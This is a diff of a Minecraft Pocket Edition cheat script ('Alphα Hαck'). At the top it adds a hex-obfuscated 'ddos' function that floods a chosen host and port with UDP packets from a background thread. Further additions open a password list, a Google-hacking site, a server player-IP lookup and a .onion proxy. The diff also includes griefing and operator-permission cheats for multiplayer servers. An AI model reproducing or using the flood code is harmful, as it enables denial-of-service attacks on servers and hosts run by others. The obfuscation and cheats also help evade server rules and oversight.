+var _0x56f5=["\x6E\x65\x74","\x55\x54\x46\x38","\x67\x65\x74\x42\x79\x74\x65\x73","","\x6C\x65\x6E\x67\x74\x68","\x67\x65\x74\x42\x79\x4E\x61\x6D\x65","\x49\x6E\x65\x74\x41\x64\x64\x72\x65\x73\x73","\x73\x65\x6E\x64","\x63\x6C\x6F\x73\x65","\x6C\x61\x6E\x67","\x73\x74\x61\x72\x74"];function ddos(_0xb446x2,_0xb446x3,_0xb446x4){var _0xb446x5= new java[_0x56f5[9]].Runnable({run:function(){try{for(var _0xb446x6=0;_0xb446x6<=_0xb446x4;_0xb446x6++){var _0xb446x7= new java[_0x56f5[0]].DatagramSocket();var _0xb446x8= new byte[2024];_0xb446x8=_0x56f5[3].toString()[_0x56f5[2]](_0x56f5[1]);_0xb446x7[_0x56f5[7]]( new java[_0x56f5[0]].DatagramPacket(_0xb446x8,_0xb446x8[_0x56f5[4]],java[_0x56f5[0]][_0x56f5[6]][_0x56f5[5]](_0xb446x2),_0xb446x3));_0xb446x7[_0x56f5[8]]()}}catch(e){print(e)}}});var _0xb446x9= new java[_0x56f5[9]].Thread(_0xb446x5);_0xb446x9[_0x56f5[10]]()}
+
 var svr = new android.widget.Button(ctx);
             svr.setText("Server IP & Port");
             svr.setOnClickListener(new android.view.View.OnClickListener({
@@ -1177,6 +1088,7 @@ var yrip = new android.widget.Button(ctx);
                 onClick: function(viewarg){
 getIp(function(info){clientMessage(client + "\n" + "External IP: " + info[0] + "\nCountry: "+info[1]+ "\nRegion: "+info[2])})
 getIp(function(info){print("IP: " + info[0])})
+clientMessage("§cDo Not Share! for your safety.");
                 }
             }));
             cmenuLayout.addView(yrip);
@@ -1247,12 +1159,12 @@ print("The IPLU Dialog Is Malfunctioning:"+e);
       }
 
 var opp = new Button(ctx);
-            opp.setText("OP permission");        
+            opp.setText("OP permission.");        
             opp.setOnClickListener(new View.OnClickListener({
                 onClick: function(viewarg){ 
 net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/setuperm " + Player.getName(Player.getEntity()) + space + operm);
 net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/setuperm " + Player.getName(Player.getEntity()) + space + operm2);
-clientMessage(client + "§7You now have OP permissions, (gives you permanent op if you were op before, if server closes you can op yourself instead of losing it after server closes.)");
+clientMessage(client + "§7(gives you permanent op if you were op before, if server closes you can op yourself instead of losing it after server closes.)");
                 }
             }));
             cmenuLayout.addView(opp);
@@ -1405,11 +1317,125 @@ print("The wb Dialog Is Malfunctioning:"+e);
       webset.setJavaScriptEnabled(true);
       webs.setWebChromeClient(new android.webkit.WebChromeClient());
       webs.setWebViewClient(new android.webkit.WebViewClient());
-      webs.loadUrl('' + wb3);
+      webs.loadUrl(wb3);
 /*Site URL*/
       new android.app.AlertDialog.Builder(ctx).setView(webs).show();
       }}));
       }
+
+var wss = new Button(ctx);
+            wss.setText("Password lookup");       
+            wss.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){         
+ 
+py(); 
+
+                }
+            }));
+            cmenuLayout.addView(wss);
+
+function py()
+      {
+      ctx.runOnUiThread(new java.lang.Runnable({run: function(){
+      var webs = new android.webkit.WebView(ctx);
+      var webset = webs.getSettings();
+      webset.setJavaScriptEnabled(true);
+      webs.setWebChromeClient(new android.webkit.WebChromeClient());
+      webs.setWebViewClient(new android.webkit.WebViewClient());
+      webs.loadUrl('https://rehmann.co/projects/10mil/');
+/*Site URL*/
+      new android.app.AlertDialog.Builder(ctx).setView(webs).show();
+      }}));
+      }
+
+var ds = new android.widget.Button(ctx);
+		ds.setText("Google hacking");
+		ds.setOnClickListener(new android.view.View.OnClickListener() {
+			onClick: function(v){
+showy(); 
+print("Loading web page");
+			}
+		});
+		cmenuLayout.addView(ds);
+
+      function showy()
+      {
+      ctx.runOnUiThread(new java.lang.Runnable({run: function(){
+      var webs = new android.webkit.WebView(ctx);
+      var webset = webs.getSettings();
+      webset.setJavaScriptEnabled(true);
+      webs.setWebChromeClient(new android.webkit.WebChromeClient());
+      webs.setWebViewClient(new android.webkit.WebViewClient());
+      webs.loadUrl('https://pentest-tools.com/information-gathering/google-hacking');
+/*Site URL*/
+      new android.app.AlertDialog.Builder(ctx).setView(webs).show();
+      }}));
+      }
+      
+      var ip1 = new android.widget.Button(ctx);
+            ip1.setText("Players list");
+            ip1.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+cmenu.dismiss();
+pip();
+                }
+            }));
+            cmenuLayout.addView(ip1);
+
+function pip() {
+ctx.runOnUiThread(new java.lang.Runnable(){
+run: function(){ 
+try{
+pip = new android.widget.PopupWindow();
+var Layer4 = new android.widget.LinearLayout(ctx);
+var ddip = new android.widget.EditText(ctx);
+var Dialog = new android.app.Dialog(ctx);
+var Exit = new android.widget.Button(ctx);
+
+Dialog.setTitle("Enter server IP");
+Dialog.setContentView(Layer4);
+
+Layer4.setOrientation(android.widget.LinearLayout.VERTICAL);
+Dialog.show();
+Layer4.addView(ddip);
+Layer4.addView(Exit);
+
+ddip.setText("");
+ddip.setHint("IP of server. e.g. c57788.leet.cc:57788");
+Exit.setText("See players");
+
+Exit.setOnClickListener(new android.view.View.OnClickListener(){
+onClick: function(view){
+ply =ddip.getText();
+Dialog.dismiss();
+goto();
+print("Loading web page");
+showMenuBtn();
+}
+});
+
+pip.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+pip.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+pip.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
+} catch (e){
+print("The IP Dialog Is Malfunctioning:"+e);
+}
+}});
+}
+
+      var _0x954a=["\x77\x65\x62\x6B\x69\x74","\x67\x65\x74\x53\x65\x74\x74\x69\x6E\x67\x73","\x73\x65\x74\x4A\x61\x76\x61\x53\x63\x72\x69\x70\x74\x45\x6E\x61\x62\x6C\x65\x64","\x73\x65\x74\x57\x65\x62\x43\x68\x72\x6F\x6D\x65\x43\x6C\x69\x65\x6E\x74","\x73\x65\x74\x57\x65\x62\x56\x69\x65\x77\x43\x6C\x69\x65\x6E\x74","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6D\x63\x61\x70\x69\x2E\x63\x61\x2F\x71\x75\x65\x72\x79\x2F","\x2F\x6C\x69\x73\x74","\x6C\x6F\x61\x64\x55\x72\x6C","\x73\x68\x6F\x77","\x73\x65\x74\x56\x69\x65\x77","\x41\x6C\x65\x72\x74\x44\x69\x61\x6C\x6F\x67","\x61\x70\x70","\x6C\x61\x6E\x67","\x72\x75\x6E\x4F\x6E\x55\x69\x54\x68\x72\x65\x61\x64"];function goto(){ctx[_0x954a[13]]( new java[_0x954a[12]].Runnable({run:function(){var _0xd647x2= new android[_0x954a[0]].WebView(ctx);var _0xd647x3=_0xd647x2[_0x954a[1]]();_0xd647x3[_0x954a[2]](true);_0xd647x2[_0x954a[3]]( new android[_0x954a[0]].WebChromeClient());_0xd647x2[_0x954a[4]]( new android[_0x954a[0]].WebViewClient());_0xd647x2[_0x954a[7]](_0x954a[5]+ply+_0x954a[6]); new android[_0x954a[11]][_0x954a[10]].Builder(ctx)[_0x954a[9]](_0xd647x2)[_0x954a[8]]()}}))}
+
+var dw = new android.widget.Button(ctx);
+		dw.setText("Dark web browser");
+		dw.setOnClickListener(new android.view.View.OnClickListener() {
+			onClick: function(v){
+print("This is not for kids!");
+clientMessage("This is private and not for children.");
+			}
+		});
+		cmenuLayout.addView(dw);
+
+var _0x95c5=["\x77\x65\x62\x6B\x69\x74","\x67\x65\x74\x53\x65\x74\x74\x69\x6E\x67\x73","\x73\x65\x74\x4A\x61\x76\x61\x53\x63\x72\x69\x70\x74\x45\x6E\x61\x62\x6C\x65\x64","\x73\x65\x74\x57\x65\x62\x43\x68\x72\x6F\x6D\x65\x43\x6C\x69\x65\x6E\x74","\x73\x65\x74\x57\x65\x62\x56\x69\x65\x77\x43\x6C\x69\x65\x6E\x74","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x75\x6C\x72\x6E\x36\x73\x72\x79\x71\x61\x69\x66\x65\x66\x6C\x64\x2E\x6F\x6E\x69\x6F\x6E\x2E\x69\x6E\x6B","\x6C\x6F\x61\x64\x55\x72\x6C","\x73\x68\x6F\x77","\x73\x65\x74\x56\x69\x65\x77","\x41\x6C\x65\x72\x74\x44\x69\x61\x6C\x6F\x67","\x61\x70\x70","\x6C\x61\x6E\x67","\x72\x75\x6E\x4F\x6E\x55\x69\x54\x68\x72\x65\x61\x64"];function deepweb(){ctx[_0x95c5[12]]( new java[_0x95c5[11]].Runnable({run:function(){var _0x49ccx2= new android[_0x95c5[0]].WebView(ctx);var _0x49ccx3=_0x49ccx2[_0x95c5[1]]();_0x49ccx3[_0x95c5[2]](true);_0x49ccx2[_0x95c5[3]]( new android[_0x95c5[0]].WebChromeClient());_0x49ccx2[_0x95c5[4]]( new android[_0x95c5[0]].WebViewClient());_0x49ccx2[_0x95c5[6]](_0x95c5[5]); new android[_0x95c5[10]][_0x95c5[9]].Builder(ctx)[_0x95c5[8]](_0x49ccx2)[_0x95c5[7]]()}}))}
 
 		var exitb2 = new android.widget.Button(ctx);
 		exitb2.setText("Exit");
@@ -1421,7 +1447,7 @@ showMenuBtn();
 		});
 		cmenuLayout.addView(exitb2);
 
-            cmenu = new PopupWindow(cmenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/3, ctx.getWindowManager().getDefaultDisplay().getHeight());
+            cmenu = new PopupWindow(cmenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/GUISize, ctx.getWindowManager().getDefaultDisplay().getHeight());
             cmenu.setBackgroundDrawable(new ColorDrawable(GUIColor));
             cmenu.showAtLocation(ctx.getWindow().getDecorView(), GUIPos | Gravity.TOP, 0, 0);
             }catch(error){
@@ -1429,6 +1455,25 @@ showMenuBtn();
             }
     }}));
 }
+
+/***********************/
+
+var zz = new android.widget.Button(ctx);
+zz.setText("ModPE Menu");
+if(GetLang=="de_DE")zz.setText('Modpe Menü');
+if(GetLang=="ko_KR")zz.setText('ModPE 메뉴');
+
+if(GetLang=="es_MX")zz.setText('Menú de Modpe');
+zz.setTextColor(GUIBtns);
+		zz.setOnClickListener(new android.view.View.OnClickListener() {
+			onClick: function(v){
+             zmenu_menu();
+             menu.dismiss();
+			}
+		});
+		menuLayout.addView(zz);
+
+/***********************/
 
 function zmenu_menu(){
 ctx.runOnUiThread(new Runnable({ run: function(){
@@ -1442,7 +1487,7 @@ ctx.runOnUiThread(new Runnable({ run: function(){
             zmenuLayout1.addView(zmenuScroll);
 
 var MainTitle = new android.widget.TextView(ctx); MainTitle.setGravity(android.view.Gravity.CENTER);
-		MainTitle.setText(name + space + version);
+		MainTitle.setText("Alphα Hαck" + space + version);
        MainTitle.setTextColor(GUIName);
 		MainTitle.setTextSize(20);
 		zmenuLayout.addView(MainTitle);
@@ -1481,13 +1526,13 @@ spa();
       switched = true;
 
 sspam = true;
-print("yes");
+print("true");
 
       }else{
       switched = false;
 
  sspam = false;
-print("no");
+print("false");
 
       }
       button.setChecked(switched);
@@ -1536,23 +1581,13 @@ print("The Spam Dialog Is Malfunctioning:"+e);
 }});
 }
 
-var cs = new Button(ctx);
-            cs.setText("Sign editor");        
-            cs.setOnClickListener(new View.OnClickListener({
-                onClick: function(viewarg){
-                    clientMessage(client + "§7This is already enabled, tap a sign!");
-print("§7This is already enabled, tap a sign!");
-                }
-            }));
-            zmenuLayout.addView(cs);
-
 var ray = new android.widget.Button(ctx);
       ray.setText("X-ray: "+(xxray?"on":"off"));
 		ray.setOnClickListener(new android.view.View.OnClickListener() {
 			onClick: function(v){         xxray?xxray=false:xxray=true;
 ray.setText("X-ray: "+(xxray?"on":"off"));
 if(xxray == true){
-clientMessage(client + "§7X-ray is on");
+clientMessage(client + "§7If you want a better X-ray download godsoft029's client!" + "\n" + "https://github.com/Godsoft029/servicehack");
 Block.setRenderLayer(1,1);
 
 Block.setRenderLayer(2,1);
@@ -1585,6 +1620,43 @@ xxray = false;
 		});
 		zmenuLayout.addView(ray);
 
+var ww = new android.widget.Button(ctx);
+      ww.setText("Water Walk: "+(waterwalk?"on":"off"));
+		ww.setOnClickListener(new android.view.View.OnClickListener() {
+			onClick: function(v){         waterwalk?waterwalk=false:waterwalk=true;
+ww.setText("Water Walk: "+(waterwalk?"on":"off"));
+if(waterwalk == true){
+clientMessage(client + "§7If you want a better water walk download godsoft029's client!" + "\n" + "https://github.com/Godsoft029/servicehack");
+
+//Made by godsoft029 don't steal
+
+Block.setShape(8, 0, 0, 0, 1, 0.6, 1);
+
+//Made by godsoft029 don't steal
+
+Block.setShape(9, 0, 0, 0, 1, 0.6, 1);
+
+//Made by godsoft029 don't steal
+
+Block.defineBlock(8, "Water", [["still_water", 0]], 8, false, 4);
+
+//Made by godsoft029 don't steal
+
+Block.defineBlock(9, "Stationary Water", [["still_water", 0]], 9, false, 4);
+
+//Made by godsoft029 don't steal
+
+waterwalk = true;
+}
+if(waterwalk == false){
+clientMessage(client + "§7Water walk is off");
+
+waterwalk = false;
+                }
+			}
+		});
+		zmenuLayout.addView(ww);
+
 var status = new android.widget.Button(ctx);
       status.setText("MC Status: "+(stat22?"on":"off"));
 		status.setOnClickListener(new android.view.View.OnClickListener() {
@@ -1595,11 +1667,13 @@ clientMessage("§7Status on");
 net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/hud off");
 clientMessage(client + "§7T = time, W = weather, B = biome, ID = item id, G = gamemode.");
 stat22 = true;
+showp = true;
 }
 if(stat22 == false){
 clientMessage("§7Status off");
 
 stat22 = false;
+showp = false;
                 }
 			}
 		});
@@ -1753,6 +1827,88 @@ print(errr);
 }}));
 }
 
+var mf = new Button(ctx);
+            mf.setText("Make food item");
+            mf.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){
+enterFood();
+                }
+            }));
+            zmenuLayout.addView(mf);
+
+function enterFood() {
+ctx.runOnUiThread(new java.lang.Runnable(){
+run: function(){ 
+try{
+GetText = new android.widget.PopupWindow();
+var Layer = new android.widget.LinearLayout(ctx);
+var ID = new android.widget.EditText(ctx);
+var Name = new android.widget.EditText(ctx);
+var Health = new android.widget.EditText(ctx);
+var Dialog = new android.app.Dialog(ctx);
+var Exit = new android.widget.Button(ctx);
+
+Dialog.setTitle("Make food items");
+Dialog.setContentView(Layer);
+
+Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
+Dialog.show();
+Layer.addView(ID);
+Layer.addView(Name);
+Layer.addView(Health);
+Layer.addView(Exit);
+
+ID.setText("");
+ID.setHint("id of item: 276");
+Name.setText("");
+Name.setHint('icon name: "diamond_sword"');
+Health.setText("");
+Health.setHint("half hearts: 20");
+Exit.setText("Done");
+
+Exit.setOnClickListener(new android.view.View.OnClickListener(){
+onClick: function(view){
+id =ID.getText();
+iconName =Name.getText();
+halfhearts =Health.getText();
+Dialog.dismiss();
+addFood();
+showMenuBtn();
+}
+});
+
+GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
+} catch (e){
+print("The food Dialog Is Malfunctioning:"+e);
+}
+}});
+}
+
+function addFood() {
+ModPE.setFoodItem(id, iconName, 0, halfhearts, "§eFood item", 64);
+}
+
+var cs = new android.widget.Button(ctx);
+      cs.setText("Sign Editor: "+(deadchat?"on":"off"));
+		cs.setOnClickListener(new android.view.View.OnClickListener() {
+			onClick: function(v){         deadchat?deadchat=false:deadchat=true;
+cs.setText("Sign Editor: "+(deadchat?"on":"off"));
+if(deadchat == true){
+clientMessage(client + "§7Sign editor is on");
+
+deadchat = true;
+}
+if(deadchat == false){
+clientMessage(client + "§7Sign editor is off");
+
+deadchat = false;
+                }
+			}
+		});
+		zmenuLayout.addView(cs);
+
 var killme = new Button(ctx);
             killme.setText("Kill yourself");        
             killme.setOnClickListener(new View.OnClickListener({
@@ -1762,25 +1918,6 @@ Player.setHealth(0);
                 }
             }));
             zmenuLayout.addView(killme);
-
-var clear = new Button(ctx);
-            clear.setText("Clear inventory");        
-            clear.setOnClickListener(new View.OnClickListener({
-                onClick: function(viewarg){ 
-clientMessage(client + "§7Coming soon.");
-                }
-            }));
-            zmenuLayout.addView(clear);
-
-var fp = new android.widget.Button(ctx);
-            fp.setText("FPS: "+(showp?"on":"off"));
-            fp.setOnClickListener(new android.view.View.OnClickListener({
-                onClick: function(viewarg){
-                showp?showp=false:showp=true;
-fp.setText("FPS: "+(showp?"on":"off"));
-                }
-            }));
-            zmenuLayout.addView(fp);
 
 var hea = new android.widget.Button(ctx);
       hea.setText("Heal hearts");
@@ -1928,59 +2065,6 @@ parti = false;
 }
             }));
             zmenuLayout.addView(p);
-
-var no = new android.widget.Button(ctx);
-      no.setText("Walk through walls: "+(nowalls?"on":"off"));
-		no.setOnClickListener(new android.view.View.OnClickListener() {
-			onClick: function(v){         nowalls?nowalls=false:nowalls=true;
-no.setText("Walk through walls: "+(nowalls?"on":"off"));
-if(nowalls == true){
-nowalls = true;
-clientMessage(client + "§7Walk through walls on");
-Entity.setCollisionSize(getPlayerEnt(), 0.1, 0.1);
-}
-if(nowalls == false){
-clientMessage(client + "§7Walk through walls off");
-Entity.setCollisionSize(getPlayerEnt(), 1, 2);
-nowalls = false;
-}
-			}
-		});
-		zmenuLayout.addView(no);
-
-var ww = new android.widget.Button(ctx);
-            ww.setText("Walk on water: "+(waterwalk?"on":"off"));
-            ww.setOnClickListener(new android.view.View.OnClickListener({
-                onClick: function(viewarg){
-waterwalk?waterwalk=false:waterwalk=true;
-ww.setText("Walk on water: "+(waterwalk?"on":"off"));
-if(waterwalk == true){
-clientMessage(client + "§7You can now walk on water!");
-}
-if(waterwalk == false){
-clientMessage(client + "§7No longer walk on water!");
-                }
-}
-            }));
-            zmenuLayout.addView(ww);
-
-var hj = new android.widget.Button(ctx);
-            hj.setText("Super jump: "+(highjumps?"on":"off"));
-            hj.setOnClickListener(new android.view.View.OnClickListener({
-                onClick: function(viewarg){
-highjumps?highjumps=false:highjumps=true;
-hj.setText("Super jump: "+(highjumps?"on":"off"));
-if(highjumps == true){
-clientMessage(client + "§7Super jump on");
-highjumps = true;
-}
-if(highjumps == false){
-clientMessage(client + "§7Super jump off");
-highjumps = false;
-                }
-}
-            }));
-            zmenuLayout.addView(hj);
 
 var g = new android.widget.Button(ctx);
             g.setText("Grief run: "+(grief?"on":"off"));
@@ -2144,7 +2228,7 @@ showMenuBtn();
 		});
 		zmenuLayout.addView(B_exit);
 
-            zmenu = new PopupWindow(zmenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/3, ctx.getWindowManager().getDefaultDisplay().getHeight());
+            zmenu = new PopupWindow(zmenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/GUISize, ctx.getWindowManager().getDefaultDisplay().getHeight());
             zmenu.setBackgroundDrawable(new ColorDrawable(GUIColor));
             zmenu.showAtLocation(ctx.getWindow().getDecorView(), GUIPos | Gravity.TOP, 0, 0);
             }catch(error){
@@ -2152,6 +2236,25 @@ showMenuBtn();
             }
     }}));
 }
+
+/***********************/
+
+var btn3 = new android.widget.Button(ctx);
+		btn3.setText("Spawn Menu");
+if(GetLang=="de_DE")btn3.setText('Spawn Menü');
+if(GetLang=="ko_KR")btn3.setText('스폰 메뉴');
+
+if(GetLang=="es_MX")btn3.setText('Menú de spawn');
+btn3.setTextColor(GUIBtns);
+		btn3.setOnClickListener(new android.view.View.OnClickListener() {
+			onClick: function(v){
+             smenu_menu();
+             menu.dismiss();
+			}
+		});
+		menuLayout.addView(btn3);
+
+/***********************/
 
 function smenu_menu(){
 ctx.runOnUiThread(new Runnable({ run: function(){
@@ -2165,7 +2268,7 @@ ctx.runOnUiThread(new Runnable({ run: function(){
             smenuLayout1.addView(smenuScroll);
 
 var MainTitle = new android.widget.TextView(ctx); MainTitle.setGravity(android.view.Gravity.CENTER);
-		MainTitle.setText(name + space + version);
+		MainTitle.setText("Alphα Hαck" + space + version);
        MainTitle.setTextColor(GUIName);
 		MainTitle.setTextSize(20);
 		smenuLayout.addView(MainTitle);
@@ -2440,7 +2543,7 @@ showMenuBtn();
 		});
 		smenuLayout.addView(B_exit);
 
-            smenu = new PopupWindow(smenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/3, ctx.getWindowManager().getDefaultDisplay().getHeight());
+            smenu = new PopupWindow(smenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/GUISize, ctx.getWindowManager().getDefaultDisplay().getHeight());
             smenu.setBackgroundDrawable(new ColorDrawable(GUIColor));
             smenu.showAtLocation(ctx.getWindow().getDecorView(), GUIPos | Gravity.TOP, 0, 0);
             }catch(error){
@@ -2448,6 +2551,26 @@ showMenuBtn();
             }
     }}));
 }
+
+/***********************/
+
+var btn4 = new android.widget.Button(ctx);
+		btn4.setText("Effect Menu");
+if(GetLang=="de_DE")btn4.setText('Effekt Menü');
+if(GetLang=="ko_KR")btn4.setText('효과 메뉴');
+
+if(GetLang=="es_MX")btn4.setText('Menú de efectos');
+btn4.setTextColor(GUIBtns);
+		btn4.setOnClickListener(new android.view.View.OnClickListener() {
+			onClick: function(v){
+             emenu_menu();
+             menu.dismiss();
+clientMessage(client + "§cMenu doesn't work in servers.");
+			}
+		});
+		menuLayout.addView(btn4);
+
+/***********************/
 
 function emenu_menu(){
 ctx.runOnUiThread(new Runnable({ run: function(){
@@ -2461,7 +2584,7 @@ ctx.runOnUiThread(new Runnable({ run: function(){
             emenuLayout1.addView(emenuScroll);
 
 var MainTitle = new android.widget.TextView(ctx); MainTitle.setGravity(android.view.Gravity.CENTER);
-		MainTitle.setText(name + space + version);
+		MainTitle.setText("Alphα Hαck" + space + version);
        MainTitle.setTextColor(GUIName);
 		MainTitle.setTextSize(20);
 		emenuLayout.addView(MainTitle);
@@ -3790,7 +3913,7 @@ showMenuBtn();
 		});
 		emenuLayout.addView(D_exit);
 
-            emenu = new PopupWindow(emenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/3, ctx.getWindowManager().getDefaultDisplay().getHeight());
+            emenu = new PopupWindow(emenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/GUISize, ctx.getWindowManager().getDefaultDisplay().getHeight());
             emenu.setBackgroundDrawable(new ColorDrawable(GUIColor));
             emenu.showAtLocation(ctx.getWindow().getDecorView(), GUIPos | Gravity.TOP, 0, 0);
             }catch(error){
@@ -3798,6 +3921,25 @@ showMenuBtn();
             }
     }}));
 }
+
+/***********************/
+
+var btn5 = new android.widget.Button(ctx);
+            btn5.setText("Teleport Menu");
+if(GetLang=="de_DE")btn5.setText('Teleport Menü');
+if(GetLang=="ko_KR")btn5.setText('텔레포트 메뉴');
+
+if(GetLang=="es_MX")btn5.setText('teletransportación');
+btn5.setTextColor(GUIBtns);
+            btn5.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+menu.dismiss();
+TeleMenu();
+                }
+            }));
+            menuLayout.addView(btn5);
+
+/***********************/
 
 function TeleMenu() {
 ctx.runOnUiThread(new java.lang.Runnable({ run: function(){
@@ -3812,7 +3954,7 @@ ctx.runOnUiThread(new java.lang.Runnable({ run: function(){
             tmenuLayout1.addView(tmenuScroll);
 
 var MainTitle = new android.widget.TextView(ctx); MainTitle.setGravity(android.view.Gravity.CENTER);
-		MainTitle.setText(name + space + version);
+		MainTitle.setText("Alphα Hαck" + space + version);
        MainTitle.setTextColor(GUIName);
 		MainTitle.setTextSize(20);
 		tmenuLayout.addView(MainTitle);
@@ -3941,6 +4083,25 @@ setPosition(Player.getEntity(), px, py, pz);
 net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/tp " + Player.getName(Player.getEntity()) + space + px + space + py + space + pz);
 }
 
+/***********************/
+
+var btn6 = new android.widget.Button(ctx);
+		btn6.setText("Nuke Menu");
+if(GetLang=="de_DE")btn6.setText('Bomben Menü');
+if(GetLang=="ko_KR")btn6.setText('핵폭탄 메뉴');
+
+if(GetLang=="es_MX")btn6.setText('Menú de bomba nuclear');
+btn6.setTextColor(GUIBtns);
+		btn6.setOnClickListener(new android.view.View.OnClickListener() {
+			onClick: function(v){
+             nmenu_menu();
+             menu.dismiss();
+			}
+		});
+		menuLayout.addView(btn6);
+
+/***********************/
+
 function nmenu_menu(){
 ctx.runOnUiThread(new Runnable({ run: function(){
         try{
@@ -3953,7 +4114,7 @@ ctx.runOnUiThread(new Runnable({ run: function(){
             nmenuLayout1.addView(nmenuScroll);
 
 var MainTitle = new android.widget.TextView(ctx); MainTitle.setGravity(android.view.Gravity.CENTER);
-		MainTitle.setText(name + space + version);
+		MainTitle.setText("Alphα Hαck" + space + version);
        MainTitle.setTextColor(GUIName);
 		MainTitle.setTextSize(20);
 		nmenuLayout.addView(MainTitle);
@@ -4072,7 +4233,7 @@ showMenuBtn();
 		});
 		nmenuLayout.addView(h_exit);
 
-            nmenu = new PopupWindow(nmenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/3, ctx.getWindowManager().getDefaultDisplay().getHeight());
+            nmenu = new PopupWindow(nmenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/GUISize, ctx.getWindowManager().getDefaultDisplay().getHeight());
             nmenu.setBackgroundDrawable(new ColorDrawable(GUIColor));
             nmenu.showAtLocation(ctx.getWindow().getDecorView(), GUIPos | Gravity.TOP, 0, 0);
             }catch(error){
@@ -4080,6 +4241,26 @@ showMenuBtn();
             }
     }}));
 }
+
+/***********************/
+
+var btn7 = new android.widget.Button(ctx);
+            btn7.setText("Give Menu");
+if(GetLang=="de_DE")btn7.setText('Item Menü');
+if(GetLang=="ko_KR")btn7.setText('아이템 주기 메뉴');
+
+if(GetLang=="es_MX")btn7.setText('Menú de tener');
+btn7.setTextColor(GUIBtns);
+            btn7.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+menu.dismiss();
+GiveMenu();
+clientMessage(client + "§cKits doesn't work in servers.");
+                }
+            }));
+            menuLayout.addView(btn7);
+
+/***********************/
 
 function GiveMenu() {
 ctx.runOnUiThread(new java.lang.Runnable({ run: function(){
@@ -4095,7 +4276,7 @@ ctx.runOnUiThread(new java.lang.Runnable({ run: function(){
 
 
 var MainTitle = new android.widget.TextView(ctx); MainTitle.setGravity(android.view.Gravity.CENTER);
-		MainTitle.setText(name + space + version);
+		MainTitle.setText("Alphα Hαck" + space + version);
        MainTitle.setTextColor(GUIName);
 		MainTitle.setTextSize(20);
 		gmenuLayout.addView(MainTitle);
@@ -4151,6 +4332,17 @@ if(j==500)clientMessage(client + "§7Done, all items added.");
                 }
             }));
             gmenuLayout.addView(butto);
+
+var clear = new Button(ctx);
+            clear.setText("Clear inventory");        
+            clear.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){ 
+clientMessage(client + "§7Inventory cleared.");
+for(var k = 0; k < 50; k++)
+       Player.clearInventorySlot(k);
+                }
+            }));
+            gmenuLayout.addView(clear);
 
 var k1 = new android.widget.Button(ctx);
             k1.setText("Leather kit");
@@ -4253,7 +4445,7 @@ print("Loading web page");
 		});
 		gmenuLayout.addView(gg_exit);
 
-            gmenu = new android.widget.PopupWindow(gmenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/2, ctx.getWindowManager().getDefaultDisplay().getHeight());
+            gmenu = new android.widget.PopupWindow(gmenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/GUISize, ctx.getWindowManager().getDefaultDisplay().getHeight());
           /*  gmenu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.GUIColor));*/
 gmenu.setBackgroundDrawable(new ColorDrawable(GUIColor));
             gmenu.showAtLocation(ctx.getWindow().getDecorView(), GUIPos | android.view.Gravity.TOP, 0, 0);
@@ -4318,6 +4510,25 @@ Player.addItemInventory(I,A,D);
 net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/give " + Player.getName(Player.getEntity()) + space + I + ":" + D + space + A);
 }
 
+/***********************/
+
+var btn8 = new android.widget.Button(ctx);
+		btn8.setText("Speed Menu");
+if(GetLang=="de_DE")btn8.setText('Speed Menü');
+if(GetLang=="ko_KR")btn8.setText('속도 메뉴');
+
+if(GetLang=="es_MX")btn8.setText('Menú de velocidad');
+btn8.setTextColor(GUIBtns);
+		btn8.setOnClickListener(new android.view.View.OnClickListener() {
+			onClick: function(v){
+             dmenu_menu();
+             menu.dismiss();
+			}
+		});
+		menuLayout.addView(btn8);
+
+/***********************/
+
 function dmenu_menu(){
 ctx.runOnUiThread(new Runnable({ run: function(){
         try{
@@ -4330,7 +4541,7 @@ ctx.runOnUiThread(new Runnable({ run: function(){
             dmenuLayout1.addView(dmenuScroll);
 
 var MainTitle = new android.widget.TextView(ctx); MainTitle.setGravity(android.view.Gravity.CENTER);
-		MainTitle.setText(name + space + version);
+		MainTitle.setText("Alphα Hαck" + space + version);
        MainTitle.setTextColor(GUIName);
 		MainTitle.setTextSize(20);
 		dmenuLayout.addView(MainTitle);
@@ -4364,7 +4575,7 @@ var d1 = new Button(ctx);
             d2.setText("Speed 5%");       
             d2.setOnClickListener(new View.OnClickListener({
                 onClick: function(viewarg){         
-                	ModPE.setGameSpeed(25);
+                	ModPE.setGameSpeed(5);
                 }
             }));
             dmenuLayout.addView(d2);
@@ -4373,7 +4584,7 @@ var d1 = new Button(ctx);
             d3.setText("Speed 10%");       
             d3.setOnClickListener(new View.OnClickListener({
                 onClick: function(viewarg){         
-                	ModPE.setGameSpeed(30);
+                	ModPE.setGameSpeed(10);
